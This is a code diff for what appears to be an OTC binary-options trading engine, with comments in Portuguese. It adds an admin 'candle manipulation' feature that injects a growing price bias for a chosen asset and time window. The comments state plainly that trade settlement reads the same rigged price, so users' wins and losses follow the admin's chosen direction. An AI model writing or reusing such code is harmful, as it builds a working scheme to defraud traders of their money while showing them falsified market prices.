@@ -92,6 +92,40 @@ const PRICE_OCTAVES = [
 ]
 const PRICE_OCTAVE_TOTAL = PRICE_OCTAVES.reduce((s, o) => s + o.amp, 0)
 
+// =============================================
+// MANIPULACAO DE VELAS (controle do admin)
+// =============================================
+// O admin pode agendar, para um ativo e um intervalo de tempo, uma direcao forcada
+// (UP = vela sobe / DOWN = vela desce). Enquanto uma manipulacao esta ativa, injetamos
+// um vies (bias) crescente sobre o preco deterministico. Como TODO o app (grafico e
+// liquidacao de operacoes) le o preco por esta mesma funcao, o resultado Win/Loss segue
+// a direcao configurada automaticamente.
+export interface CandleManipulation {
+  symbol: string
+  direction: "UP" | "DOWN"
+  startMs: number
+  endMs: number
+}
+
+let ACTIVE_MANIPULATIONS: CandleManipulation[] = []
+
+/** Substitui a lista de manipulacoes ativas (chamado pelo cliente e pelo servidor). */
+export function setManipulations(list: CandleManipulation[]) {
+  ACTIVE_MANIPULATIONS = Array.isArray(list) ? list : []
+}
+
+export function getManipulations(): CandleManipulation[] {
+  return ACTIVE_MANIPULATIONS
+}
+
+/** Retorna a manipulacao ativa para um ativo em um dado instante (ms), se houver. */
+function findManipulation(symbol: string, tMs: number): CandleManipulation | null {
+  for (const m of ACTIVE_MANIPULATIONS) {
+    if (m.symbol === symbol && tMs >= m.startMs && tMs <= m.endMs) return m
+  }
+  return null
+}
+
 function getLivePrice(asset: OTCAsset, timestamp: number): number {
   const symSeed = asset.basePrice * 13.37
 
@@ -114,6 +148,19 @@ function getLivePrice(asset: OTCAsset, timestamp: number): number {
   // Hard cap proporcional a propria banda, para nunca "estourar" a escala do grafico.
   const hardCap = asset.basePrice * bandPct * 1.3
   price = Math.max(asset.basePrice - hardCap, Math.min(asset.basePrice + hardCap, price))
+
+  // ---- Aplica manipulacao do admin, se ativa para este ativo/instante ----
+  const manip = ACTIVE_MANIPULATIONS.length ? findManipulation(asset.symbol, timestamp * 1000) : null
+  if (manip) {
+    const dur = Math.max(1, manip.endMs - manip.startMs)
+    // Progresso 0..1 dentro da janela; o vies cresce suavemente ate ~2.5x a banda,
+    // garantindo um movimento direcional forte e continuo (vela cheia pra cima/baixo).
+    const progress = Math.min(1, Math.max(0, (timestamp * 1000 - manip.startMs) / dur))
+    const eased = progress * progress * (3 - 2 * progress) // smoothstep
+    const strength = asset.basePrice * bandPct * 2.5 * eased
+    price += manip.direction === "UP" ? strength : -strength
+    if (price <= 0) price = asset.basePrice * 0.5
+  }
 
   const prec = asset.decimals
   return Number(price.toFixed(prec))
@@ -171,6 +218,13 @@ class MultiAssetEngine {
     const asset = OTC_ASSETS.find(a => a.symbol === symbol)
     if (!asset) return 0
     return getLivePrice(asset, Date.now() / 1000)
+  }
+
+  // Preco deterministico (com manipulacao aplicada, se houver) em um instante especifico (segundos).
+  getPriceAtTime(symbol: string, timestampSeconds: number): number {
+    const asset = OTC_ASSETS.find(a => a.symbol === symbol)
+    if (!asset) return 0
+    return getLivePrice(asset, timestampSeconds)
   }
 
   getCandles(symbol: string, timeframe: 60 | 300 | 600): OTCCandle[] {
